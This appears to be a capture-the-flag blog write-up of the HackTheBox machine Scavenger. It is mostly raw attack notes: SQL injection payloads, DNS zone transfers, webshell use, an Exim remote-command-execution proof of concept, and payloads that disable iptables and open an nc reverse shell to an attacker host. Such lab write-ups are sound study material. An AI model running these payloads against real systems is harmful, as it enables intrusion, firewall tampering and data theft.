---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/5AQG64lj4mo/0.jpg
layout: post
media_subpath: /assets/posts/2020-02-29-scavenger-hackthebox
tags:
- exim
- hackthebox
- linux
- sql injection
title: Scavenger @ HackTheBox
---

Scavenger is a 40 Point machine on hackthebox that involves a lot of enumeration, a SQL injection, and in my video, an unintended root by exploiting exim.

{% youtube 5AQG64lj4mo %}

## Notes

SQL injection:

```
') UNION (SELECT (SELECT GROUP_CONCAT(table_schema, table_name  SEPARATOR " | ") FROM information_schema.tables where table_schema != "information_schema"), 2) #
```

```
') UNION (SELECT (SELECT GROUP_CONCAT(table_schema, table_name, column_name SEPARATOR " | ") FROM  information_schema.columns where table_schema != "information_schema"), 2) #
```

```
') UNION (SELECT (SELECT GROUP_CONCAT(id, domain SEPARATOR " / ") FROM  whois.customers), 2) #
```

Vhosts:

```
supersechosting.htb, justanotherblog.htb, pwnhats.htb, rentahacker.htb
```

Zonetransfer:

```
dig axfr @scavenger.htb supersechosting.htb
dig axfr @scavenger.htb justanotherblog.htb
dig axfr @scavenger.htb pwnhats.htb
dig axfr @scavenger.htb rentahacker.htb
```

Webshell:

```
http://sec03.rentahacker.htb/shell.php?hidden=dpkg+-l+|grep+exim
```

Exim PoC:

```
(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{PAYLOAD}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25
```

Exim payloads

```
/bin/sh -c "iptables -I INPUT 1 -j ACCEPT"
/bin/sh -c "iptables -I OUTPUT 1 -j ACCEPT"
/bin/sh -c "nc <lhost> 4141 -e /bin/sh"
```

Send exploit (hex encode payload, paste into PoC, then base64 encode everything and replace "payload" below):

```
echo+<payload>|base64+-d|sh
```